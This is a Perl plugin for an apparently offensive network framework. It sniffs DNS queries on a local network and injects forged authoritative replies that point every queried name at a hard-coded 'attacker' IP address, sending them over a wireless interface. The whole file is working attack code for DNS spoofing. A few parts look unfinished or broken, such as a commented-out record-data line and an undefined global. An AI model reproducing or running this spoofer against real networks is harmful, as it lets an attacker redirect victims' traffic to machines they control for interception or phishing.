package Plugin::DNSSniffer;
use Moose;

use Nemesis::Inject;
our $VERSION = '0.1a';
our $AUTHOR  = "luca9010";
our $MODULE  = "DNSSniffer plugin";
our $INFO    = "<www.dark-lab.net>";

our @PUBLIC_FUNCTIONS = qw(start stop);

nemesis module { 1; }

# moduli per la gestione dei pacchetti
use Net::Frame;
use Net::Frame::Simple;
use Net::Frame::Layer::ETH qw(:consts);
use Net::Frame::Layer::IPv4 qw(:consts);
use Net::Frame::Layer::UDP qw(:consts);
use Net::Frame::Layer::DNS qw(:consts);
use Data::Dumper;

my $loop = 0;

sub start() {
    my $self = shift;

    if ( $self->Init->checkroot() ) {
        $self->Init->getIO()
            ->print_alert(
            "You need root permission to do this; otherwise you wouldn't see anything"
            );
    }
    my $LiveSniffer = $Init->ml->getInstance("LiveSniffer");
    $LiveSniffer->start();
}

sub clear() {
    my $self = shift;

    $self->stop();
}

sub stop() {
    my $self = shift;

    #$self->Sniffer()->destroy() if($self->Sniffer);
}

sub event_udp() {
    my $self   = shift;
    my $Packet = shift;

    my $IO = $Init->io;

    #$Init->io->info(__PACKAGE__." Received a UDP package");

    my $eth;
    my $eth_custom;
    my $ipv4;
    my $ipv4_custom;
    my $udp;
    my $udp_custom;
    my $dns;
    my $dns_custom;
    my $dnsQ;
    my $dnsR_custom;

    #$self->Init->getIO()->print_info( $Packet );
    #$self->Init->getIO()->print_info( $Packet->firstLayer );
    $eth  = $Packet->ref->{ETH};
    $ipv4 = $Packet->ref->{IPv4};
    $udp  = $Packet->ref->{UDP};
    $dns  = $Packet->ref->{DNS};
    $dnsQ = $Packet->ref->{'DNS::Question'};

    ##################################################################
    #     if($ipv4->dst eq "192.168.1.209"){
    #     $self->Init->getIO()->print_info("YEEEEESSSSSSSSSSSSSSSSSSSSSS\n");
    # }

    # if( $loop < 2 ) {
    #     if($udp->dst eq "53" || $udp->src eq "53"){
    #         $self->Init->getIO()->print_info( $Packet->print );
    #         $loop = $loop + 1;
    #     }
    # }

    ##################################################################

    if ( $eth->isa("Net::Frame::Layer::ETH") ) {
        $eth_custom = Net::Frame::Layer::ETH->new(
            src  => $eth->dst,
            dst  => $eth->src,
            type => NF_ETH_TYPE_IPv4,
        );

    }

    # creazione layer 3 (IP)
    if ( $ipv4->isa("Net::Frame::Layer::IPv4") ) {

        $ipv4_custom = Net::Frame::Layer::IPv4->new(
            id => $ipv4->id,

            #src => '192.168.1.4', #debug
            src      => $ipv4->dst,
            protocol => NF_IPv4_PROTOCOL_UDP,
            dst      => $ipv4->src
        );

        #$self->Init->getIO()->print_info( $ipv4->print );
        #$self->Init->getIO()->print_info( $ipv4_custom->print );

    }

    #creazione layer 4 (UDP)
    if ( $udp->isa("Net::Frame::Layer::UDP") ) {

        if ( $udp->dst eq "53" ) {

            # Creazione layer UDP
            $udp_custom = Net::Frame::Layer::UDP->new(
                src => $udp->dst,
                dst => $udp->src
            );

            #$self->Init->getIO()->print_info( $udp->print );
            #$self->Init->getIO()->print_info( $udp_custom->print );

            # creazione layer DNS
            if ( $dns->isa("Net::Frame::Layer::DNS") ) {

                #build an DNS header
                $dns_custom = Net::Frame::Layer::DNS->new(
                    id => $dns->id,
                    qr => NF_DNS_QR_RESPONSE
                    , #messaggio dns di risposta (corrisposnde a valore booleano 1)
                    opcode => $dns->opcode
                    , # deve avere lo stesso valore dello stesso campo presente nel pacchetto dns di richiesta
                    flags => NF_DNS_FLAGS_AA,
                    rcode => NF_DNS_RCODE_NOERROR
                    , # deve essere a NOERROR o a zero per indicare che non ci sono stati errori nella richiesta
                    qdCount => 1,    # n° di entry nella sezione question
                    anCount => 1,    # n° di entry nella sezione response
                    nsCount => 0
                    , # n° of name server resource records in the authority records section.
                    arCount => 0
                    , # n° of resource records in the additional records section.
                );

                #$self->Init->getIO()->print_info( $dns->print );
                #$self->Init->getIO()->print_info( $dns_custom->print );

                if ( $dnsQ->isa("Net::Frame::Layer::DNS::Question") ) {
                    use Net::Frame::Layer::DNS::RR qw(:consts);

                    # indirizzo ip sul quale associare la richiesta
                    my $rdata = Net::Frame::Layer::DNS::RR::A->new(
                        address => '192.168.1.208',    # indirizzo ip attacker
                    );

                    # creazione di un record RR
                    my $dnsR_custom = Net::Frame::Layer::DNS::RR->new(
                        name     => $dnsQ->name,
                        type     => NF_DNS_TYPE_A,
                        class    => NF_DNS_CLASS_IN,
                        ttl      => 3600,
                        rdlength => $rdata->getLength,

                        #rdata    => $rdata->pack,
                    );

                    # Riassembla il frame
                    my $packet_custom = Net::Frame::Simple->new(
                        layers => [
                            $eth_custom, $ipv4_custom, $udp_custom,
                            $dns_custom, $dnsQ,        $dnsR_custom,
                            $rdata
                        ]
                    );

                    $self->Init->getIO()
                        ->print_info("-->PACCHETTO DI RICHIESTA<--\n");
                    $self->Init->getIO()->print_info( $Packet->print . "\n" );
                    $self->Init->getIO()
                        ->print_info(
                        "-->PACCHETTO DI RISPOSTA CUSTOMIZZATO<--\n");
                    $self->Init->getIO()
                        ->print_info( $packet_custom->print . "\n" );

                    # configurazione sender
                    use Net::Write::Layer qw(:constants);
                    use Net::Write::Layer2;
                    my $oWrite = Net::Write::Layer2->new( dev => 'wlp2s0', );
                    $oWrite->open;

                    # We send the frame
                    $packet_custom->send($oWrite);
                    $oWrite->close;
                }
            }
        }

    }
    else {
        #  $self->Init->io()->debug_dumper(\$Packet);
    }

}

1;

